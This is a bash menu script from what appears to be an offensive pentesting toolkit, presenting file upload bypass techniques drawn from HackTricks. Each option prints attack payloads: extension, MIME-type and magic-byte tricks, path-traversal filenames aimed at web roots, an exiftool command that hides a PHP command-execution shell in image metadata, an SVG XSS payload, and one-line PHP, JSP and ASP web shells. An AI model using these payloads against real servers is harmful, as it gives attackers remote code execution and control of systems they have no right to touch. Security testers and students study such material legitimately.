#!/bin/bash
# HackTricks Ref: file-upload
# Module: File Upload Vulnerabilities & Bypass Techniques

echo -e "${C6}[WEB ATTACK: SERVER_FILE_UPLOAD]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/file-upload"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Bypass Technique:${NC}"
echo "1) Extension Bypass (Blacklist/Whitelist)"
echo "2) Content-Type & Magic Bytes Spoofing"
echo "3) Path Traversal (Filename Manipulation)"
echo "4) Polyglot Files (XSS/RCE in Images)"
echo "5) Web Shell Quick-Reference"
echo "0) Exit"

read -p "Selection: " upload_opt

case $upload_opt in
    1)
        echo -e "\n${C2}[*] Extension Bypass Techniques:${NC}"
        echo " - Alternate Extensions: .php5, .phtml, .phar, .asa, .jspx, .ashx"
        echo " - Case Sensitivity: .PhP, .aSpX"
        echo " - Null Byte Injection (Old servers): shell.php%00.jpg"
        echo " - Double Extension: shell.jpg.php"
        ;;
    2)
        echo -e "\n${C2}[*] Content-Type & Magic Bytes:${NC}"
        echo " - Change Header: Content-Type: image/jpeg"
        echo " - Add Magic Bytes at start of file:"
        echo "   - GIF: GIF89a;[SHELL]"
        echo "   - PNG: \x89PNG\r\n\x1a\n...[SHELL]"
        ;;
    3)
        echo -e "\n${C2}[*] Filename Traversal:${NC}"
        echo "Try to upload to a different directory:"
        echo " - Filename: ../../../var/www/html/shell.php"
        echo " - Filename: ..\..\..\inetpub\wwwroot\shell.aspx"
        ;;
    4)
        echo -e "\n${C2}[*] Polyglot & Metadata:${NC}"
        echo " - Inject PHP code into EXIF metadata (Comment field)."
        echo " - Use 'exiftool -Comment='<?php system(\$_GET['cmd']); ?>' shell.jpg'"
        echo " - SVG XSS: <svg onload='alert(1)'></svg>"
        ;;
    5)
        echo -e "\n${C2}[*] Web Shell Cheat Sheet:${NC}"
        echo " - PHP: <?php system(\$_GET['cmd']); ?>"
        echo " - JSP: <% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
        echo " - ASP: <% eval request(\"cmd\") %>"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
